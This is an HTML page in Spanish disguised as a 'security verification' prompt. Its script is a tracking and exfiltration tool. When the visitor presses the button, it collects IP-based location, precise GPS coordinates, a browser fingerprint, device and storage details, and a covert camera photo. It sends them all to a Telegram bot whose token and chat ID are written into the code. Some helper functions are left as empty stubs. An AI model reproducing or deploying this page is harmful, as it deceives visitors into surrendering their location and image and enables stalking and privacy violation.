<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de seguridad</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #f1f3f4; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .card { background: white; border-radius: 16px; box-shadow: 0 8px 28px rgba(0,0,0,0.12); padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; }
        h1 { font-size: 1.8rem; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 28px; }
        button { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 12px 24px; font-size: 1rem; font-weight: 500; cursor: pointer; width: 100%; transition: background 0.2s; }
        button:active { background: #1557b0; transform: scale(0.98); }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Verificación requerida</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar acceso</button>
</div>
<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // ================= CONFIGURACIÓN =================
    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev'; // Tu Worker
    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';                   // ⚠️ Cámbialo
    const CHAT_ID = '7555997298';

    // ---------- 1. Ubicación desde Worker ----------
    async function getLocationFromWorker() {
        try {
            const res = await fetch(WORKER_URL);
            const data = await res.json();
            return {
                ip: data.ip || 'N/A',
                country: data.country || 'N/A',
                region: data.region || 'N/A',
                city: data.city || 'N/A',
                postal: data.postal || 'N/A',
                timezone: data.timezone || 'N/A'
            };
        } catch(e) { return null; }
    }

    // ---------- 2. Ubicación desde ipapi.co ----------
    async function getLocationFromIpapi() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip || 'N/A',
                country: data.country_name || 'N/A',
                region: data.region || 'N/A',
                city: data.city || 'N/A',
                postal: data.postal || 'N/A',
                timezone: data.timezone || 'N/A'
            };
        } catch(e) { return null; }
    }

    // ---------- 3. Fingerprint, dispositivo, almacenamiento, GPS, cámara (igual que antes) ----------
    async function getFingerprint() { /* ... */ }
    function getDeviceInfo() { /* ... */ }
    async function getStorageInfo() { /* ... */ }
    function getGPS() { /* ... */ }
    async function capturePhoto() { /* ... */ }
    async function sendMessage(text) { /* ... */ }
    async function sendPhoto(blob) { /* ... */ }

    // ---------- 4. Proceso principal (mostrando ambas ubicaciones) ----------
    document.getElementById('btn').onclick = async () => {
        // Obtener ambas ubicaciones por IP
        const [workerLoc, ipapiLoc] = await Promise.all([
            getLocationFromWorker(),
            getLocationFromIpapi()
        ]);
        const gps = await getGPS();
        const [fp, device, storage] = await Promise.all([
            getFingerprint(),
            getDeviceInfo(),
            getStorageInfo()
        ]);
        const foto = await capturePhoto();

        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
        message += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
        message += `📍 *Location Details (Cloudflare Worker)*\n`;
        if (workerLoc && workerLoc.city !== 'N/A') {
            message += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
        } else {
            message += `   • No disponible\n`;
        }
        message += `📍 *Location Details (ipapi.co)*\n`;
        if (ipapiLoc && ipapiLoc.city !== 'N/A') {
            message += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
        } else {
            message += `   • No disponible\n`;
        }
        if (gps) {
            message += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
        } else {
            message += `📍 *GPS: Permiso denegado o no disponible*\n`;
        }
        message += `\n🖼️ *Display*\n   • Resolution: ${device.resolution}\n`;
        message += `🔐 *Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado'}\n   • Location: ${gps ? 'Permitido' : 'Denegado'}\n`;
        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A\n   • Storage Used: ${storage.used} GB / Total: ${storage.total} GB\n`;
        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;

        await sendMessage(message);
        if (foto) await sendPhoto(foto);
    };
</script>
</body>
</html>
